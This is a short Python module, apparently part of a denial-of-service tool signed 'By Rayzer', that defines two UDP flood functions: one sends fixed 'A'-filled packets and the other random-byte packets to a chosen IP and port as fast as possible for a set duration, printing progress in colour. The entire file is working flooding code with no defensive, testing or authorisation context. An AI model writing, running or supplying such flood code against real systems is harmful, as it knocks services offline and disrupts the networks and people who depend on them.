# By Rayzer
import socket
import random
import time
import threading
from utils.colors import color

# By Rayzer
def udp_plain_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = b"A" * packet_size

    print(color(f"[*] Starting UDP Plain flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...", "blue"))
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(color(f"[!] Error during UDP Plain flood: {e}", "red"))
    finally:
        sock.close()
        print(color(f"[+] UDP Plain flood complete! Sent {packet_count} packets.", "green"))

# By Rayzer
def udp_random_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0

    print(color(f"[*] Starting UDP Random flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...", "blue"))
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(color(f"[!] Error during UDP Random flood: {e}", "red"))
    finally:
        sock.close()
        print(color(f"[+] UDP Random flood complete! Sent {packet_count} packets.", "green"))